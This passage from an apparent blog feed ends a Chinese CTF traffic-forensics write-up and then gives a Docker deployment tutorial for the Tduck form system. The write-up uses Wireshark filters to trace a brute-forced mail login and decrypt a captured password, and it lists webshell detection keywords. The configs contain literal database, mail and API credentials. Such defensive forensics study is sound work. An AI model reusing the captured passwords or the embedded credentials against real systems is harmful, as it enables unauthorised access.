class="line">11189(内网地址)-&gt;100(连接vpn后重新分配的内网地址)</span><br></pre></td></tr></table></figure><p>所以这题的答案就是<code>10.3.3.100</code></p><h4 id="10、黑客使用了什么账号登陆了mail系统（形式-username-x2F-password）"><a href="#10、黑客使用了什么账号登陆了mail系统（形式-username-x2F-password）" class="headerlink" title="10、黑客使用了什么账号登陆了mail系统（形式: username&#x2F;password）"></a>10、黑客使用了什么账号登陆了mail系统（形式: username&#x2F;password）</h4><blockquote><p>既然说是mail系统那我们就在mail的两个包里面寻求答案，在mailtwo里面输入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot; and http contains &quot;password&quot;</span><br></pre></td></tr></table></figure><p>出现很多相同username不同密码的请求，很有可能是在爆破mail系统，在mailtwo1这一个包里面同样的过滤还存在几条成立请求，对比一下时间，这应该是mailtwo还没爆破完mailtwo1这个包继续爆破，在mailtwo包里面的序号28的信息里面对应下面的几条response，发现一名叫wenwenni的人应该是登录成功的，经过了一个check的过程，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var loginCheck = function(form) &#123;</span><br><span class="line">        if(form.username.value == &quot;&quot;) &#123;</span><br><span class="line">            alert(&quot;...........................&quot;);</span><br><span class="line">            form.username.focus();</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(form.password.value == &quot;&quot;) &#123;</span><br><span class="line">            alert(&quot;...........................&quot;);</span><br><span class="line">            form.password.focus();</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            var key_hash = CryptoJS.MD5(&#x27;1234567812345678&#x27;);</span><br><span class="line">            var key = CryptoJS.enc.Utfpars</span><br></pre></td></tr></table></figure><blockquote><p>然后回显下面的信息<br><img src="https://s1.ax1x.com/2018/08/30/PjBQDx.png" alt="PjBQDx.png"><br>所以感觉应该有这样的重点字在里面</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&#123;\\&quot;success\\&quot;:true&#125;&quot; and ip.addr==1159</span><br></pre></td></tr></table></figure><blockquote><p>于是乎过滤，但是第一个包里面太多了，这一题其实我也不怎么确定，为什么与这么多success的还得继续爆破下去？希望有大佬能讲一讲。。。。<br>之鞥按照常规套路，把在mailtwo1包里面的筛出来的最后一个标记一下，再过滤回http，再来<code>ctrl+shift+N</code>跳到标记处，然后往回找有关登录的请求，找到的第一个请求。。。<br>PjBlb6.md.png</p></blockquote><blockquote><p>那个密码需要AES解密，利用上面的算法求出key大概是。。。个人感觉这题最有难度<br><a href="http://encode.chahuo.com/">http://encode.chahuo.com/</a></p></blockquote><blockquote><p>解密出来的结果跟第三题的答案一样。。。。。后来看到有人说这是社工手段，直接套第三题答案，有意思有意思。。。。</p></blockquote><h4 id="11、黑客获得的vpn-ip是多少"><a href="#11、黑客获得的vpn-ip是多少" class="headerlink" title="11、黑客获得的vpn,ip是多少"></a>11、黑客获得的vpn,ip是多少</h4><blockquote><p>最后一题在vpntwo这个包里面直接点击统计-&gt;端点，又学到了一种方法<br>看到发包最多的是<code>10.3.4.3</code><br>PjB8UO.md.png<br>所以这个答案就是<code>10.3.4.3</code></p></blockquote><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><blockquote><p>感觉流量分析还是有点套路的，第一点就是多用点contains语句，模糊匹配一下，关键字靠自己的灵活性以及分析过程得出的结论，个人感觉大部分题目会给出，比如的话有小马上传的时候，你会想到会存在关键字，比如eval,assert之类的东西吗，别人用拼接方式传的马那就另当别论了。。但是还是可以通过菜刀的一些标志来识别的，例如&gt;||&lt;之类符号，2333<br>第二就是各种自动化扫描器的指纹特征，还是得记一下，有点用，第三就是可以通过统计去发现某些ip的发包次数，从而确定可疑ip</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h3&gt;&lt;h3 id=&quot;题目概述&quot;&gt;&lt;a href=&quot;#题目概述&quot; class=&quot;headerlink&quot; title=&quot;题目概述&quot;&gt;&lt;/a&gt;题目概述&lt;/h</summary>
      
    
    
    
    <category term="writeup" scheme="https://lhhxs.github.io/categories/writeup/"/>
    
    
    <category term="流量分析" scheme="https://lhhxs.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    <category term="wireshark" scheme="https://lhhxs.github.io/tags/wireshark/"/>
    
  </entry>
  
  <entry>
    <title>在线表单收集系统Tduck（docker篇）</title>
    <link href="https://lhhxs.github.io/2022/09/17/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E5%9C%A8%E7%BA%BF%E8%A1%A8%E5%8D%95%E6%94%B6%E9%9B%86%E7%B3%BB%E7%BB%9FTduck%EF%BC%88docker%E7%AF%87%EF%BC%89/"/>
    <id>https://lhhxs.github.io/2022/09/17/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E5%9C%A8%E7%BA%BF%E8%A1%A8%E5%8D%95%E6%94%B6%E9%9B%86%E7%B3%BB%E7%BB%9FTduck%EF%BC%88docker%E7%AF%87%EF%BC%89/</id>
    <published>2022-09-17T10:54:52.487Z</published>
    <updated>2022-09-18T02:58:06.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在线表单收集系统Tduck（docker篇）"><a href="#在线表单收集系统Tduck（docker篇）" class="headerlink" title="在线表单收集系统Tduck（docker篇）"></a>在线表单收集系统Tduck（docker篇）</h1><p>不止一个人在微信公众号给我发送 <code>tduck</code> ，所以老苏决定再研究下 <code>docker</code> 版</p><blockquote><p>之前老苏已写过基于 <code>CentOS</code> 的安装方法</p><ul><li><a href="https://laosu.ml/2021/06/11/%E5%9C%A8%E7%BA%BF%E8%A1%A8%E5%8D%95%E6%94%B6%E9%9B%86%E7%B3%BB%E7%BB%9FTduck%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89/">在线表单收集系统Tduck（上篇）</a></li><li><a href="https://laosu.ml/2021/06/14/%E5%9C%A8%E7%BA%BF%E8%A1%A8%E5%8D%95%E6%94%B6%E9%9B%86%E7%B3%BB%E7%BB%9FTduck%EF%BC%88%E4%B8%8B%E7%AF%87%EF%BC%89/">在线表单收集系统Tduck（下篇）</a></li></ul></blockquote><p>没有找到官方的镜像，不过你可以试试👇</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a834070478c624b70881c765d0ab2831.png"></p><p>这是一个多合一的镜像，用于体验还是可以的，安装说明可以在参考文档部分找到，但是似乎并不支持设置自己的邮箱、微信公众号等，所以也就没办法用自己的账号登录了。</p><h1 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h1><blockquote><p>如果你不想自己构建，可以跳过，直接阅读下一章节</p></blockquote><p>管方提供的 <code>dockerfile</code> 需要用户自己将后端编译的 <code>tduck-api.jar</code> 拷贝到 <code>docker</code> 目录，将前端打包后的 <code>dist</code> 里的文件拷贝到 <code>docker/front</code> 目录，这得把老苏之前写的搭建的环境操作再重做一遍，着实有点麻烦，老苏更希望实现从源代码直接编译打包镜像，总体思路继承了 <code>YesPlayMusic</code>，把前后端打进一个镜像，这样比较方便 <code>nginx</code> 做前后端分流处理</p><p><code>Dockerfile</code> 分为了三个部分，其中 <code>前端构建</code> 和 <code>后端构建</code> 是可以独立使用的，<code>前端构建</code> 可以生成 <code>dist</code>，而 <code>后端构建</code>能生成 <code>tduck-api.jar</code></p><h2 id="修改前端front配置"><a href="#修改前端front配置" class="headerlink" title="修改前端front配置"></a>修改前端front配置</h2><p>在master和V3版本分支中tduck-front配置是开发者使用的，api和web以及浏览器都是在本机的情况下有用，因此我们要在tduck-front修改<code>vue.config.js</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">publicPath</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">  <span class="attr">lintOnSave</span>: process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>, <span class="comment">//对应.env.production</span></span><br><span class="line">  <span class="attr">productionSourceMap</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">disableHostCheck</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">open</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8888</span>,</span><br><span class="line">    <span class="comment">// 开发环境默认开启反向代理，如果不需要请自行注释</span></span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;/tduck-api&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;http://localhost:8999&#x27;</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>修改<code>.env.production</code>的VUE_APP_API_ROOT配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 页面标题；xxxx提供技术支持</span></span><br><span class="line"><span class="string">VUE_APP_TITLE</span> <span class="string">=</span> <span class="string">tduck-填鸭</span></span><br><span class="line"><span class="comment"># 接口请求地址，会设置到 axios 的 baseURL 参数上</span></span><br><span class="line"><span class="string">VUE_APP_API_ROOT</span> <span class="string">=</span> <span class="string">/tduck-api</span></span><br><span class="line"><span class="comment"># 调试工具，可设置 eruda 或 vconsole，如果不需要开启则留空</span></span><br><span class="line"><span class="string">VUE_APP_DEBUG_TOOL</span> <span class="string">=</span></span><br><span class="line"><span class="comment"># 高德地图key</span></span><br><span class="line"><span class="string">VUE_APP_MAP_KEY</span> <span class="string">=</span> <span class="string">f2200337d0d08538e78729572749882d</span></span><br><span class="line"><span class="comment"># 微信功能开关 开启设置 ON，关闭设置 OFF</span></span><br><span class="line"><span class="string">VUE_APP_WX</span> <span class="string">=</span> <span class="string">ON</span></span><br></pre></td></tr></table></figure><h2 id="修改后端API配置"><a href="#修改后端API配置" class="headerlink" title="修改后端API配置"></a>修改后端API配置</h2><p>找到文件<code>tduck-platform/tduck-api/src/main/resources/application.yml</code>，修改以下配置：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">tduck-api</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">prod</span> <span class="comment">#对应application-prod.yml 文件配置</span></span><br><span class="line">  <span class="attr">jackson:</span></span><br><span class="line">    <span class="attr">time-zone:</span> <span class="string">GMT+8</span></span><br><span class="line">    <span class="attr">date-format:</span> <span class="string">yyyy-MM-dd</span> <span class="string">HH:mm:ss</span></span><br><span class="line">  <span class="attr">mail:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">smtp.88.com</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">465</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">smtps</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">multipart:</span></span><br><span class="line">      <span class="attr">max-file-size:</span> <span class="string">100MB</span></span><br><span class="line">      <span class="attr">max-request-size:</span> <span class="string">100MB</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">ehcache:</span></span><br><span class="line">      <span class="attr">config:</span> <span class="string">classpath:ehcache.xml</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8999</span></span><br><span class="line">  <span class="comment">#增加上下文目录</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/tduck-api</span></span><br><span class="line">  <span class="attr">compression:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">mime-types:</span> <span class="string">application/javascript,text/css,application/json,application/xml,text/html,text/xml,text/plain</span></span><br></pre></td></tr></table></figure><p>配置application-prod.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://tduck-mysql:3306/tduck?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=UTC&amp;tinyInt1isBit=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">abc123123</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">    <span class="attr">hikari:</span></span><br><span class="line">      <span class="attr">minimum-idle:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">maximum-pool-size:</span> <span class="number">15</span></span><br><span class="line">      <span class="attr">auto-commit:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">idle-timeout:</span> <span class="number">30000</span></span><br><span class="line">      <span class="attr">pool-name:</span> <span class="string">DatebookHikariCP</span></span><br><span class="line">      <span class="attr">max-lifetime:</span> <span class="number">1800000</span></span><br><span class="line">      <span class="attr">connection-test-query:</span> <span class="string">SELECT</span> <span class="number">1</span> <span class="string">FROM</span> <span class="string">DUAL</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">database:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">tduck-redis</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">password:</span></span><br><span class="line">    <span class="attr">timeout:</span> <span class="string">6000ms</span>  <span class="comment"># 连接超时时长（毫秒）</span></span><br><span class="line">    <span class="attr">jedis:</span></span><br><span class="line">      <span class="attr">pool:</span></span><br><span class="line">        <span class="attr">max-active:</span> <span class="number">1000</span>  <span class="comment"># 连接池最大连接数（使用负值表示没有限制）</span></span><br><span class="line">        <span class="attr">max-wait:</span> <span class="string">-1ms</span>      <span class="comment"># 连接池最大阻塞等待时间（使用负值表示没有限制）</span></span><br><span class="line">        <span class="attr">max-idle:</span> <span class="number">10</span>      <span class="comment"># 连接池中的最大空闲连接</span></span><br><span class="line">        <span class="attr">min-idle:</span> <span class="number">5</span>       <span class="comment"># 连接池中的最小空闲连接</span></span><br><span class="line">  <span class="attr">mail:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">smtp.163.com</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">test@163.com</span>  <span class="comment"># 邮箱账号</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">DSXFPX24XOBURMDY</span> <span class="comment">#邮箱授权码</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">oss:</span></span><br><span class="line">    <span class="attr">ossType:</span> <span class="number">3</span> <span class="comment"># 本地存储</span></span><br><span class="line">    <span class="attr">endpoint:</span></span><br><span class="line">    <span class="attr">accessKeyId:</span></span><br><span class="line">    <span class="attr">accessKeySecret:</span></span><br><span class="line">    <span class="attr">bucketName:</span> <span class="string">tduck-cloud</span></span><br><span class="line">    <span class="attr">domain:</span> <span class="string">http://tduck-app/file_upload/profile</span>  <span class="comment">#提供访问的域名,file_upload是在web目录下的一个文件夹，专门存放附件</span></span><br><span class="line">    <span class="attr">upload-folder:</span> <span class="string">/usr/share/nginx/html/file_upload/profile</span> <span class="comment">#文件存放的位置，新建目录/usr/share/nginx/html/file_upload/</span></span><br><span class="line">    <span class="attr">access-path-pattern:</span> <span class="string">/profile/**</span>  <span class="comment"># 文件访问路径前缀 这里更改domain也需要更改</span></span><br></pre></td></tr></table></figure><h2 id="镜像构建"><a href="#镜像构建" class="headerlink" title="镜像构建"></a>镜像构建</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前端构建</span></span><br><span class="line"><span class="keyword">FROM</span> node:<span class="number">16.5</span> as build-front</span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> maintainer=laosu&lt;wbsu2003@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> /tduck-front/package.json ./</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install -g cnpm --registry=https://registry.npm.taobao.org</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> /tduck-front/. ./</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> cnpm install</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> cnpm run build</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 后端构建</span></span><br><span class="line"><span class="keyword">FROM</span> maven:<span class="number">3.6</span>.<span class="number">0</span>-jdk-<span class="number">11</span>-slim AS build_end</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . ./</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> mvn -f /tduck-platform/pom.xml clean package -DskipTests</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 整体打包</span></span><br><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">11</span>-jre-slim</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get clean \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y supervisor nginx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## nginx</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build_end ./nginx.conf /etc/nginx/nginx.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## supervisor</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build_end ./supervisord.conf /etc/supervisord.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 前端静态文件</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-front /app/dist/ /usr/share/nginx/html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 后端jar包</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build_end /tduck-platform/tduck-api/target/tduck-api.jar /usr/local/lib/tduck-api.jar</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8999</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;supervisord&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/etc/supervisord.conf&quot;</span>] </span></span><br></pre></td></tr></table></figure><p><code>nginx</code> 设置文件 <code>nginx.conf</code> 用的是官方的，只修改了 <code>proxy_pass</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  form.tec-do.com;</span><br><span class="line">        root /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">          # 静态文件地址 root访问路径会把请求的路径带上</span><br><span class="line">            root   /usr/share/nginx/html;</span><br><span class="line">        try_files $uri$args $uri$args/ /index.html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /tduck-api/ &#123;</span><br><span class="line">            proxy_set_header Host $http_host;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_pass http://tduck-app:8999/tduck-api/;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #error_page   500 502 503 504  /50x.html;</span><br><span class="line">        #location = /50x.html &#123;</span><br><span class="line">        #    root   html;</span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>supervisord.conf</code> 文件是新增用来控制进程的，前端 <code>app</code> 是运行在 <code>nginx</code> 上的静态页面，后端 <code>tduck_api</code> 基于 <code>jar</code> 包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[include]</span><br><span class="line">files = /etc/supervisor/conf.d/*.conf</span><br><span class="line"></span><br><span class="line">[program:app]</span><br><span class="line">command=nginx -g &quot;daemon off;&quot;</span><br><span class="line"></span><br><span class="line">[program:api]</span><br><span class="line">command=java -Dfile.encoding=UTF-8 -jar /usr/local/lib/tduck-api.jar</span><br><span class="line"></span><br><span class="line">#directory will be any folder where you wnat supervisor to cd before executing.</span><br><span class="line">#directory=/project </span><br><span class="line">autostart=true</span><br><span class="line">autorestart=false</span><br><span class="line">startretries=3</span><br><span class="line"></span><br><span class="line">#user will be anyone you want but make sure that user will have the enough privilage.</span><br><span class="line">user=root</span><br><span class="line"></span><br><span class="line">[supervisord]</span><br><span class="line">nodaemon=true</span><br><span class="line">logfile=/tmp/supervisord.log</span><br><span class="line">pidfile=/tmp/supervisord.pid</span><br><span class="line">loglevel=debug</span><br><span class="line">logfile_maxbytes=10MB</span><br><span class="line"></span><br><span class="line">[supervisorctl] </span><br></pre></td></tr></table></figure><p><code>docker-compose.yaml</code> 基于官方的修改而成，因为做了前后端二合一，所以去掉了 <code>tduck-front</code>，但是新增了邮件环境变量，只是默认并没有启用</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.6&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">tduck-app:</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="comment">#      - SPRING_DATASOURCE_DRIVER-CLASS-NAME=com.mysql.cj.jdbc.driver</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_DATASOURCE_URL=$SPRING_DATASOURCE_URL</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_DATASOURCE_USERNAME=$SPRING_DATASOURCE_NAME</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_DATASOURCE_PASSWORD=$MYSQL_ROOT_PASSWORD</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_REDIS_DATABASE=0</span></span><br><span class="line">      <span class="bullet">-</span> <span 